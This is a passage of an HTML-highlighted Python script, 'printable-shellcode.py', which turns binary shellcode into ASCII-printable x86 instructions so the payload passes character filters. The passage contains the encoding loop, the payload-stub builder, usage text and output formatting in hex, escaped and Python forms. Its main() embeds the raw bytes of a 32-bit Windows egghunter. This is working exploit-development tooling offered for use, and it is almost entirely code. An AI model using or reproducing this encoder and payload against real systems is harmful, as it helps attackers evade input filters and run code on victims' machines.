style="color:#ff9d00;font-weight:700">if</span>&nbsp;val&nbsp;!=&nbsp;dword:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'in&nbsp;attempt&nbsp;#%d&nbsp;values&nbsp;do&nbsp;not&nbsp;match:&nbsp;0x%08x&nbsp;!=&nbsp;0x%08x'</span>&nbsp;%&nbsp;(ctr,val,dword))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;valdec&nbsp;=&nbsp;decompose(ctypes.c_uint32(val).value&nbsp;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dworddec&nbsp;=&nbsp;decompose(ctypes.c_uint32(dword).value)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;We&nbsp;check&nbsp;each&nbsp;of&nbsp;the&nbsp;four&nbsp;bytes&nbsp;whether&nbsp;they&nbsp;differ&nbsp;from&nbsp;desired.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff0044;font-weight:400">4</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;valdec[i]&nbsp;!=&nbsp;dworddec[i]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'byte&nbsp;%d&nbsp;needs&nbsp;fixing&nbsp;%02x&nbsp;=&gt;&nbsp;%02x'</span>&nbsp;%&nbsp;(i,&nbsp;valdec[i],&nbsp;dworddec[i]))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Since&nbsp;they&nbsp;differ,&nbsp;we&nbsp;fixup&nbsp;them</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diff&nbsp;=&nbsp;valdec[i]&nbsp;-&nbsp;dworddec[i]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr[<span style="color:#ff0044;font-weight:400">16</span>&nbsp;+&nbsp;i]&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">chr</span>(<span style="color:#ff9d00;font-weight:700">ord</span>(pr[<span style="color:#ff0044;font-weight:400">16</span>&nbsp;+&nbsp;i])&nbsp;+&nbsp;diff)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;coeffs[<span style="color:#ff0044;font-weight:400">3</span>][i]&nbsp;+=&nbsp;diff<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Resulted&nbsp;byte&nbsp;after&nbsp;applied&nbsp;fixup&nbsp;outlies&nbsp;our&nbsp;VALID_CHARS&nbsp;charset,</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;we&nbsp;could&nbsp;have&nbsp;re-invoke&nbsp;the&nbsp;gen()&nbsp;routine&nbsp;here,&nbsp;but&nbsp;it&nbsp;will&nbsp;be&nbsp;easier</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;to&nbsp;just&nbsp;quit&nbsp;and&nbsp;try&nbsp;again&nbsp;from&nbsp;the&nbsp;scratch.</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;pr[<span style="color:#ff0044;font-weight:400">16</span>&nbsp;+&nbsp;i]&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;VALID_CHARS:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">raise</span>&nbsp;InvalidCharResulted(pr[<span style="color:#ff0044;font-weight:400">16</span>+i])<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dbg(<span style="color:#3ad900;font-weight:400">'Values&nbsp;match&nbsp;perfectly:&nbsp;0x%08x&nbsp;==&nbsp;0x%08x'</span>&nbsp;%&nbsp;(val,&nbsp;dword))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;val&nbsp;!=&nbsp;dword:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'\n[!]&nbsp;COMPUTATION&nbsp;FAILURE:&nbsp;0x%08x&nbsp;!=&nbsp;0x%08x'</span>&nbsp;%&nbsp;(val,&nbsp;dword)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(-<span style="color:#ff0044;font-weight:400">1</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join(pr)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;ret<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;process(inp,&nbsp;prepend_init&nbsp;=&nbsp;PREPEND_INIT):<br />&nbsp;&nbsp;&nbsp;&nbsp;size&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(inp)<br />&nbsp;&nbsp;&nbsp;&nbsp;pad&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">4</span>&nbsp;-&nbsp;(size&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">4</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;pad&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">4</span>:&nbsp;pad&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;alphabet&nbsp;=&nbsp;strfry(VALID_CHARS)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Build&nbsp;up&nbsp;initial&nbsp;payload's&nbsp;stub</span><br />&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;prepend_init:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'zero-eax'</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'set-eax-to-esp'</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'eax-stack-align'</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'set-esp-to-eax'</span>]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;PREPEND_ZERO_OUT:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'zero-eax'</span>]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;inp&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'\x90'</span>&nbsp;*&nbsp;pad<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">assert</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(buf)&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">4</span>&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"Working&nbsp;buffer&nbsp;must&nbsp;be&nbsp;divisble&nbsp;by&nbsp;4!"</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;prev&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Iterate&nbsp;over&nbsp;every&nbsp;next&nbsp;four&nbsp;bytes&nbsp;grouped&nbsp;values&nbsp;(DWORDs)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff9d00;font-weight:700">len</span>(buf),&nbsp;<span style="color:#ff0044;font-weight:400">0</span>,&nbsp;-<span style="color:#ff0044;font-weight:400">4</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;=&nbsp;struct.unpack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;buf[i-<span style="color:#ff0044;font-weight:400">4</span>:i])[<span style="color:#ff0044;font-weight:400">0</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alphabet&nbsp;=&nbsp;strfry(alphabet)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;instr&nbsp;=&nbsp;gen(dword,&nbsp;prev,&nbsp;alphabet)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;PREPEND_ZERO_OUT:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'zero-eax'</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev&nbsp;=&nbsp;dword<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;instr&nbsp;+&nbsp;primitives[<span style="color:#3ad900;font-weight:400">'store-on-stack'</span>]<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;out<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;usage():<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'''<br />&nbsp;&nbsp;&nbsp;&nbsp;::&nbsp;printable-shellcode.py&nbsp;-&nbsp;Utility&nbsp;generating&nbsp;a&nbsp;ASCII-printable&nbsp;shellcode<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;of&nbsp;provided&nbsp;binary&nbsp;file&nbsp;(ASCII&nbsp;encoder).<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mariusz&nbsp;B.&nbsp;/&nbsp;mgeeky,&nbsp;'17<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Algorithm&nbsp;based&nbsp;on&nbsp;terrific&nbsp;`dissembler`&nbsp;tool&nbsp;by&nbsp;Phiral&nbsp;Research&nbsp;Labs,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;Jon&nbsp;Erickson&nbsp;&lt;matrix@phiral.com&gt;<br /><br />Usage:<br />&nbsp;&nbsp;&nbsp;&nbsp;printable-shellcode.py&nbsp;&lt;input-file|0xValue&gt;&nbsp;&lt;output-file&gt;<br /><br />Where:<br />&nbsp;&nbsp;&nbsp;&nbsp;input-file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;input&nbsp;file&nbsp;containing&nbsp;shellcode,&nbsp;'-'&nbsp;for&nbsp;stdin&nbsp;or&nbsp;'EGG'&nbsp;for&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;standard&nbsp;T00WT00W&nbsp;32-bit&nbsp;windows&nbsp;egghunter<br />&nbsp;&nbsp;&nbsp;&nbsp;0xValue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;single&nbsp;DWORD&nbsp;value,&nbsp;prepended&nbsp;with&nbsp;0x&nbsp;to&nbsp;encode.<br />&nbsp;&nbsp;&nbsp;&nbsp;output-file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;file&nbsp;to&nbsp;store&nbsp;result&nbsp;of&nbsp;ASCII&nbsp;encoding,&nbsp;or&nbsp;'-'&nbsp;for&nbsp;stdout<br />'''</span><br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;display_output(out):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[+]&nbsp;SHELLCODE&nbsp;ENCODED&nbsp;PROPERLY.&nbsp;Resulted&nbsp;length:&nbsp;%d&nbsp;bytes'</span>&nbsp;%&nbsp;(<span style="color:#ff9d00;font-weight:700">len</span>(out))<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'-'</span>&nbsp;*&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;out<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'-'</span>&nbsp;*&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[+]&nbsp;HEX&nbsp;FORM:'</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join([<span style="color:#3ad900;font-weight:400">'%02x'</span>&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(c)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;out])<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[+]&nbsp;ESCAPED-HEX&nbsp;FORM:'</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join([<span style="color:#3ad900;font-weight:400">'\\x%02x'</span>&nbsp;%&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(c)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;out])<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[+]&nbsp;PYTHON&nbsp;COMPACT&nbsp;SEXY&nbsp;FORM:'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'\tshellcode&nbsp;+=&nbsp;r"'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;i&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">range</span>(<span style="color:#ff9d00;font-weight:700">len</span>(out)):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;i&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">20</span>&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;i&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">'"\n\tshellcode&nbsp;+=&nbsp;r"'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;out[i]<br />&nbsp;&nbsp;&nbsp;&nbsp;buf&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">'"'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;buf<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;primitives_precheck():<br />&nbsp;&nbsp;&nbsp;&nbsp;failed&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;k,&nbsp;v&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;primitives.items():<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;v:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;VALID_CHARS:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[!]&nbsp;ERROR:&nbsp;Primitive&nbsp;"%s"&nbsp;contains&nbsp;illegal&nbsp;character&nbsp;in&nbsp;it:&nbsp;(0x%02x,&nbsp;"%c")'</span>&nbsp;%&nbsp;(k,&nbsp;<span style="color:#ff9d00;font-weight:700">ord</span>(c),&nbsp;c)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">'[!]&nbsp;It&nbsp;means&nbsp;you&nbsp;will&nbsp;have&nbsp;to&nbsp;find&nbsp;a&nbsp;suitable&nbsp;primitive&nbsp;yourself&nbsp;and&nbsp;modify&nbsp;the&nbsp;`primitives`&nbsp;dictionary&nbsp;within&nbsp;this&nbsp;script.'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;failed&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;failed<br /><br /><span style="color:#ff9d00;font-weight:700">def</span>&nbsp;main():<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">3</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(sys.argv)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;<span style="color:#ff9d00;font-weight:700">and</span>&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>].startswith(<span style="color:#3ad900;font-weight:400">'0x'</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">pass</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usage()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;primitives_precheck():<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;input_bytes&nbsp;=&nbsp;[]<br />&nbsp;&nbsp;&nbsp;&nbsp;prepend_init&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">True</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'-'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input_bytes&nbsp;=&nbsp;sys.stdin.read()<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>].startswith(<span style="color:#3ad900;font-weight:400">'0x'</span>):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input_bytes&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">''</span>.join([<span style="color:#ff9d00;font-weight:700">chr</span>(c)&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;c&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;decompose(<span style="color:#ff9d00;font-weight:700">int</span>(sys.argv[<span style="color:#ff0044;font-weight:400">1</span>],&nbsp;<span style="color:#ff0044;font-weight:400">16</span>))])<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prepend_init&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">elif</span>&nbsp;sys.argv[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'EGG'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input_bytes&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">with</span>&nbsp;<span style="color:#ff9d00;font-weight:700">open</span>(sys.argv[<span 